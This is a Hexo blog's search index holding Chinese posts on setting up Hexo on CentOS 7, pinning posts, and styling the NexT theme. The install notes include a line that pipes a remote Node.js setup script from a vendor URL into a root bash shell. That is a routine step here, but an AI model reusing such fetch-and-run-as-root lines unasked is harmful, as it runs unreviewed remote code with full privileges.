<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>写在前面</title>
    <url>/2020/01/29/blog_formal/home/</url>
    <content><![CDATA[<h1 id="如果全世界都对你恶意相加，我就对你说上一世情话"><a href="#如果全世界都对你恶意相加，我就对你说上一世情话" class="headerlink" title="如果全世界都对你恶意相加，我就对你说上一世情话"></a>如果全世界都对你恶意相加，我就对你说上一世情话</h1><p><img data-src="./home/1.png" alt></p>
]]></content>
      <tags>
        <tag>home</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 随笔</title>
    <url>/2020/09/02/blog_formal/%E5%B7%A5%E5%85%B7/hexo%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<h1 id="hexo随笔"><a href="#hexo随笔" class="headerlink" title="hexo随笔"></a>hexo随笔</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>主要记录一些常见的问题</p>
<ul>
<li>文章置顶</li>
</ul>
<a id="more"></a>

<h2 id="文章置顶"><a href="#文章置顶" class="headerlink" title="文章置顶"></a>文章置顶</h2><p>如下操作</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// node_modules/hexo-generator-index/lib/generator.js</span></span><br><span class="line"><span class="comment">// 添加如下代码</span></span><br><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> pagination = <span class="built_in">require</span>(<span class="string">'hexo-pagination'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> config = <span class="keyword">this</span>.config;</span><br><span class="line">  <span class="keyword">const</span> posts = locals.posts.sort(config.index_generator.order_by);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加 置顶功能 begin</span></span><br><span class="line">  posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 添加 置顶功能 end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> paginationDir = config.pagination_dir || <span class="string">'page'</span>;</span><br><span class="line">  <span class="keyword">const</span> path = config.index_generator.path || <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pagination(path, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">'index'</span>, <span class="string">'archive'</span>],</span><br><span class="line">    format: paginationDir + <span class="string">'/%d/'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 环境安装</title>
    <url>/2020/09/03/blog_formal/%E5%B7%A5%E5%85%B7/%E5%AE%89%E8%A3%85hexo/</url>
    <content><![CDATA[<h1 id="开始安装hexo"><a href="#开始安装hexo" class="headerlink" title="开始安装hexo"></a>开始安装hexo</h1><p>环境: centos7</p>
<p>本文是安装 hexo的记录</p>
<a id="more"></a>

<h2 id="替换yum更新源"><a href="#替换yum更新源" class="headerlink" title="替换yum更新源"></a>替换yum更新源</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载阿里镜像源文件</span></span><br><span class="line">wget http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 替换文件</span></span><br><span class="line">cp Centos-7.repo /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 清除系统yum 缓存</span></span><br><span class="line">yum clean all </span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成yum缓存</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure>

<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装 git</span></span><br><span class="line">sudo yum install git-core -y</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装 Node.js</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> As root</span></span><br><span class="line">curl -sL https://rpm.nodesource.com/setup_14.x | bash -</span><br><span class="line"><span class="meta">#</span><span class="bash"> No root privileges </span></span><br><span class="line">curl -sL https://rpm.nodesource.com/setup_14.x | sudo bash -</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Run `sudo yum install -y nodejs` to install Node.js 14.x and npm.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># You may also need development tools to build native addons:</span></span></span><br><span class="line">     sudo yum install gcc-c++ make</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># To install the Yarn package manager, run:</span></span></span><br><span class="line">     curl -sL https://dl.yarnpkg.com/rpm/yarn.repo | sudo tee /etc/yum.repos.d/yarn.repo</span><br><span class="line">     sudo yum install yarn</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装gcc-c++</span></span><br><span class="line">sudo yum install gcc-c++ make -y</span><br><span class="line"><span class="meta">#</span><span class="bash"> install the Yarn package manager</span></span><br><span class="line">curl -sL https://dl.yarnpkg.com/rpm/yarn.repo | sudo tee </span><br><span class="line"><span class="meta">#</span><span class="bash"> install Node.js 14.x and npm</span></span><br><span class="line">sudo yum install -y nodejs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装 hexo-cli</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="meta">#</span><span class="bash"> 写入环境变量</span></span><br><span class="line">echo 'PATH="$PATH:./node_modules/.bin"' &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure>

<h2 id="主题相关"><a href="#主题相关" class="headerlink" title="主题相关"></a>主题相关</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 更换默认主题 个人比较喜欢next的风格</span></span><br><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改 _config.yml 主题信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Extensions</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Plugins: https://hexo.io/plugins/</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Themes: https://hexo.io/themes/</span></span></span><br><span class="line">theme: next</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改主题配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启字数统计</span></span><br><span class="line">https://github.com/theme-next/hexo-symbols-count-time</span><br></pre></td></tr></table></figure>



<h2 id="一些命令"><a href="#一些命令" class="headerlink" title="一些命令"></a>一些命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 初始化</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> &lt;folder&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install</span></span><br><span class="line"></span><br><span class="line">generate</span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo generate</span></span><br><span class="line">生成静态文件。</span><br><span class="line">选项	描述</span><br><span class="line">-d, --deploy	文件生成后立即部署网站</span><br><span class="line">-w, --watch	监视文件变动</span><br><span class="line">-b, --bail	生成过程中如果发生任何未处理的异常则抛出异常</span><br><span class="line">-f, --force	强制重新生成文件</span><br><span class="line">Hexo 引入了差分机制，如果 public 目录存在，那么 hexo g 只会重新生成改动的文件。</span><br><span class="line">使用该参数的效果接近 hexo clean &amp;&amp; hexo generate</span><br><span class="line">-c, --concurrency	最大同时生成文件的数量，默认无限制</span><br><span class="line">该命令可以简写为</span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo g</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> hexo server</span></span><br><span class="line">启动服务器。默认情况下，访问网址为： http://localhost:4000/。</span><br><span class="line">选项	描述</span><br><span class="line">-p, --port	重设端口</span><br><span class="line">-s, --static	只使用静态文件</span><br><span class="line">-l, --log	启动日记记录，使用覆盖记录格式</span><br></pre></td></tr></table></figure>

<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><h3 id="图片不显示"><a href="#图片不显示" class="headerlink" title="图片不显示"></a>图片不显示</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> hexo _config.yml 文件</span></span><br><span class="line">post_asset_folder: true</span><br><span class="line"></span><br><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image -- save</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>美化hexo</title>
    <url>/2020/09/06/blog_formal/%E5%B7%A5%E5%85%B7/%E7%BE%8E%E5%8C%96hexo/</url>
    <content><![CDATA[<h1 id="美化HEXO"><a href="#美化HEXO" class="headerlink" title="美化HEXO"></a>美化HEXO</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>主要介绍下安装hexo博客后的一些美化操作</p>
<a id="more"></a>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题下载</span></span><br><span class="line">git clone https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<h2 id="默认状态"><a href="#默认状态" class="headerlink" title="默认状态"></a>默认状态</h2><p><img data-src="./%E7%BE%8E%E5%8C%96hexo/1.png" alt></p>
<h2 id="美化过程"><a href="#美化过程" class="headerlink" title="美化过程"></a>美化过程</h2><h3 id="设置博客文字描述-amp-amp-语言设置"><a href="#设置博客文字描述-amp-amp-语言设置" class="headerlink" title="设置博客文字描述&amp;&amp;语言设置"></a>设置博客文字描述&amp;&amp;语言设置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> hexo _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Site</span></span><br><span class="line">title: 菜心空间</span><br><span class="line">subtitle: ''</span><br><span class="line">description: '目标&amp;&amp;付出'</span><br><span class="line">keywords:</span><br><span class="line">author: 菜心</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: Asia/Shanghai</span><br></pre></td></tr></table></figure>

<h3 id="主题文件-amp-amp-主题样式配置"><a href="#主题文件-amp-amp-主题样式配置" class="headerlink" title="主题文件&amp;&amp;主题样式配置"></a>主题文件&amp;&amp;主题样式配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> hexo _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Extensions</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Plugins: https://hexo.io/plugins/</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Themes: https://hexo.io/themes/</span></span></span><br><span class="line">theme: next</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Schemes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> scheme: Muse</span></span><br><span class="line"><span class="meta">#</span><span class="bash">scheme: Mist</span></span><br><span class="line"><span class="meta">#</span><span class="bash">scheme: Pisces</span></span><br><span class="line">scheme: Gemini</span><br></pre></td></tr></table></figure>

<h3 id="博客持久化链接"><a href="#博客持久化链接" class="headerlink" title="博客持久化链接"></a>博客持久化链接</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> internet 方法 个人未用</span></span><br><span class="line">npm install hexo-abbrlink --save</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line">permalink: post/:abbrlink.html</span><br><span class="line">abbrlink:</span><br><span class="line">  alg: crc32  </span><br><span class="line">  rep: hex</span><br></pre></td></tr></table></figure>

<h3 id="菜单增加关于、标签、分类页面"><a href="#菜单增加关于、标签、分类页面" class="headerlink" title="菜单增加关于、标签、分类页面"></a>菜单增加关于、标签、分类页面</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line"><span class="meta">  #</span><span class="bash">schedule: /schedule/ || fa fa-calendar</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">sitemap: /sitemap.xml || fa fa-sitemap</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">commonweal: /404/ || fa fa-heartbeat</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 新增相关页面</span></span><br><span class="line">hexo new page "about"</span><br><span class="line">hexo new page "tags"</span><br><span class="line">hexo new page "categories"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成页面配置</span></span><br><span class="line">source\about\index.md</span><br><span class="line">source\tags\index.md</span><br><span class="line">source\categories\index.md</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: 关于</span><br><span class="line">type: "about"</span><br><span class="line">date: 2020-09-19 22:17:43</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">type: "categories"</span><br><span class="line">date: 2020-09-19 22:17:58</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">type: "tags"</span><br><span class="line">date: 2020-09-19 22:17:51</span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<h3 id="搜索功能"><a href="#搜索功能" class="headerlink" title="搜索功能"></a>搜索功能</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  </span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 搜索功能</span></span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br><span class="line"><span class="meta">#</span><span class="bash"> local_search:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">enable</span>: <span class="literal">true</span></span></span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta">  #</span><span class="bash"> If auto, trigger search by changing input.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> If manual, trigger search by pressing enter key or search button.</span></span><br><span class="line">  trigger: auto</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Show top n results per article, show all results by setting to -1</span></span><br><span class="line">  top_n_per_article: 1</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Unescape html strings to the readable one.</span></span><br><span class="line">  unescape: false</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Preload the search data when the page loads.</span></span><br><span class="line">  preload: false</span><br></pre></td></tr></table></figure>

<h3 id="背景图片-amp-amp-透明度"><a href="#背景图片-amp-amp-透明度" class="headerlink" title="背景图片&amp;&amp;透明度"></a>背景图片&amp;&amp;透明度</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Define custom file paths.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create your custom files <span class="keyword">in</span> site directory `<span class="built_in">source</span>/_data` and uncomment needed files below.</span></span><br><span class="line">custom_file_path:</span><br><span class="line"><span class="meta">  #</span><span class="bash">head: <span class="built_in">source</span>/_data/head.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">header: <span class="built_in">source</span>/_data/header.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">sidebar: <span class="built_in">source</span>/_data/sidebar.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">postMeta: <span class="built_in">source</span>/_data/post-meta.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">postBodyEnd: <span class="built_in">source</span>/_data/post-body-end.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">footer: <span class="built_in">source</span>/_data/footer.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">bodyEnd: <span class="built_in">source</span>/_data/body-end.swig</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">variable: <span class="built_in">source</span>/_data/variables.styl</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">mixin: <span class="built_in">source</span>/_data/mixins.styl</span></span><br><span class="line">  style: source/_data/styles.styl</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第一种</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 添加 <span class="built_in">source</span>/_data/styles.styl 文件 文件内容如下</span></span><br><span class="line">body &#123;</span><br><span class="line">    background:url(/assets/background.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment:fixed;</span><br><span class="line">    background-position:50% 50%;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">    //可选</span><br><span class="line">    +mobile()&#123;</span><br><span class="line">      //background-position: 0% -20%;https://i.loli.net/2018/12/29/5c270a0523154.jpg</span><br><span class="line">      //https://i.loli.net/2018/12/29/5c270fc2bfcad.png</span><br><span class="line">      background-image: url(https://ziyuan.lruihao.cn/images/bg_cell.png);</span><br><span class="line">      background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 第二种</span></span><br><span class="line">// Custom styles.</span><br><span class="line">// 整体背景设置</span><br><span class="line">body &#123;</span><br><span class="line"> 	background:url(/images/background.jpg);// 设定背景图片,images同处于source文件夹下</span><br><span class="line"> 	background-repeat: no-repeat;// 设定背景图片非重复填充</span><br><span class="line">    background-attachment:fixed;// 设置背景图片不随页面滚动</span><br><span class="line">    background-position:50% 50%;// 设置背景图片位置</span><br><span class="line">	background-size: cover// 设置保持图像的纵横比并将图像缩放成将完全覆盖背景定位区域的最小大小</span><br><span class="line">    opacity: 0.7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 页面头样式属性</span><br><span class="line">.header-inner &#123;</span><br><span class="line">  // 也可以同时定义背景色</span><br><span class="line">  // background: #ddd </span><br><span class="line">  // 透明度</span><br><span class="line">  opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line">// sidebar侧边工具栏样式属性</span><br><span class="line">.sidebar&#123;</span><br><span class="line">    // 动画过渡时间</span><br><span class="line">	transition-duration: 0.4s;</span><br><span class="line">    // 透明度</span><br><span class="line">	opacity: 0.8</span><br><span class="line">&#125;</span><br><span class="line">// 标题样式</span><br><span class="line">.posts-expand .post-title-link &#123;</span><br><span class="line">	// 设置字体颜色</span><br><span class="line">	color: #222;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 文章版块样式</span><br><span class="line">.post-block &#123;</span><br><span class="line">    //background: var(--content-bg-color);</span><br><span class="line">	background: #fff</span><br><span class="line">    border-radius: initial;</span><br><span class="line">    box-shadow: 0 2px 2px 0 rgba(0,0,0,0.12), 0 3px 1px -2px rgba(0,0,0,0.06), 0 1px 5px 0 rgba(0,0,0,0.12);</span><br><span class="line">    padding: 40px;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="canvas-ribbon-动态背景"><a href="#canvas-ribbon-动态背景" class="headerlink" title="canvas_ribbon 动态背景"></a>canvas_ribbon 动态背景</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: true</span><br><span class="line">  size: 300 # The width of the ribbon</span><br><span class="line">  alpha: 0.6 # The transparency of the ribbon</span><br><span class="line">  zIndex: -1 # The display level of the ribbon</span><br></pre></td></tr></table></figure>

<h3 id="侧栏阅读进度百分比"><a href="#侧栏阅读进度百分比" class="headerlink" title="侧栏阅读进度百分比"></a>侧栏阅读进度百分比</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">back2top:</span><br><span class="line">  enable: true</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Back to top <span class="keyword">in</span> sidebar.</span></span><br><span class="line">  sidebar: true</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Scroll percent label <span class="keyword">in</span> b2t button.</span></span><br><span class="line">  scrollpercent: true</span><br></pre></td></tr></table></figure>

<h3 id="网站底部信息"><a href="#网站底部信息" class="headerlink" title="网站底部信息"></a>网站底部信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/hexo/themes/next/layout/_partials/footer.swig</span><br><span class="line">去除下面代码</span><br><span class="line">&#123;%- if theme.footer.powered %&#125;</span><br><span class="line">  &lt;div class="powered-by"&gt;</span><br><span class="line">    &#123;%- set next_site = 'https://theme-next.org' %&#125;</span><br><span class="line">    &#123;%- if theme.scheme !== 'Gemini' %&#125;</span><br><span class="line">      &#123;%- set next_site = 'https://' + theme.scheme | lower + '.theme-next.org' %&#125;</span><br><span class="line">    &#123;%- endif %&#125;</span><br><span class="line">    &#123;&#123;- __('footer.powered', next_url('https://hexo.io', 'Hexo', &#123;class: 'theme-link'&#125;) + ' &amp; ' + next_url(next_site, 'NexT.' + theme.scheme, &#123;class: 'theme-link'&#125;)) &#125;&#125;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="网站运行时间"><a href="#网站运行时间" class="headerlink" title="网站运行时间"></a>网站运行时间</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/hexo/themes/next/layout/_partials/footer.swig</span><br><span class="line">添加如下代码</span><br><span class="line">&lt;!-- 网站运行时间的设置 begin--&gt;</span><br><span class="line">&lt;span id="timeDate"&gt;载入天数...&lt;/span&gt;</span><br><span class="line">&lt;span id="times"&gt;载入时分秒...&lt;/span&gt;  You are my love!</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var now = new Date();</span><br><span class="line">    function createtime() &#123;</span><br><span class="line">        var grt= new Date("01/05/2020 00:00:00");//此处修改你的建站时间或者网站上线时间</span><br><span class="line">        now.setTime(now.getTime()+250);</span><br><span class="line">        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);</span><br><span class="line">        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);</span><br><span class="line">        if(String(hnum).length ==1 )&#123;hnum = "0" + hnum;&#125; minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);</span><br><span class="line">        mnum = Math.floor(minutes); if(String(mnum).length ==1 )&#123;mnum = "0" + mnum;&#125;</span><br><span class="line">        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);</span><br><span class="line">        snum = Math.round(seconds); if(String(snum).length ==1 )&#123;snum = "0" + snum;&#125;</span><br><span class="line">        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 ";</span><br><span class="line">        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";</span><br><span class="line">&#125;</span><br><span class="line">setInterval("createtime()",250);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 网站运行时间的设置 end--&gt;</span><br></pre></td></tr></table></figure>

<h3 id="图片放大功能"><a href="#图片放大功能" class="headerlink" title="图片放大功能"></a>图片放大功能</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> FancyBox is a tool that offers a nice and elegant way to add zooming functionality <span class="keyword">for</span> images.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> For more information: https://fancyapps.com/fancybox</span></span><br><span class="line">fancybox: true</span><br></pre></td></tr></table></figure>

<h3 id="图片懒加载设置"><a href="#图片懒加载设置" class="headerlink" title="图片懒加载设置"></a>图片懒加载设置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 提升加载速度 只有看到的时候才会加载</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Vanilla JavaScript plugin <span class="keyword">for</span> lazyloading images.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> For more information: https://github.com/ApoorvSaxena/lozad.js</span></span><br><span class="line">lazyload: true</span><br></pre></td></tr></table></figure>

<h3 id="标签云特效"><a href="#标签云特效" class="headerlink" title="标签云特效"></a>标签云特效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-tag-cloud@^2.0.* --save</span><br><span class="line"></span><br><span class="line">theme/next/layout/_macro/sidebar.swig, 在 back2top.sidebar 上方添加如下代码</span><br><span class="line">&#123;% if site.tags.length &gt; 1 %&#125;</span><br><span class="line">&lt;script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"&gt;&lt;/script&gt;</span><br><span class="line">&lt;div class="widget-wrap"&gt;</span><br><span class="line">    &lt;h3 class="widget-title"&gt;Tag Cloud&lt;/h3&gt;</span><br><span class="line">    &lt;div id="myCanvasContainer" class="widget tagcloud"&gt;</span><br><span class="line">        &lt;canvas width="250" height="250" id="resCanvas" style="width=100%"&gt;</span><br><span class="line">            &#123;&#123; list_tags() &#125;&#125;</span><br><span class="line">        &lt;/canvas&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hexo-tag-cloud</span></span><br><span class="line">tag_cloud:</span><br><span class="line">    textFont: Trebuchet MS, Helvetica</span><br><span class="line">    textColor: '#333'</span><br><span class="line">    textHeight: 25</span><br><span class="line">    outlineColor: '#E2E1D1'</span><br><span class="line">    maxSpeed: 0.1</span><br></pre></td></tr></table></figure>

<h3 id="代码块复制和代码高亮"><a href="#代码块复制和代码高亮" class="headerlink" title="代码块复制和代码高亮"></a>代码块复制和代码高亮</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line">codeblock:</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Code Highlight theme</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Available values: normal | night | night eighties | night blue | night bright | solarized | solarized dark | galactic</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> See: https://github.com/chriskempson/tomorrow-theme</span></span><br><span class="line">  highlight_theme: normal</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Add copy button on codeblock</span></span><br><span class="line">  copy_button:</span><br><span class="line">    enable: true</span><br><span class="line">    # Show text copy result.</span><br><span class="line">    show_result: true</span><br><span class="line">    # Available values: default | flat | mac</span><br><span class="line">    style:</span><br></pre></td></tr></table></figure>

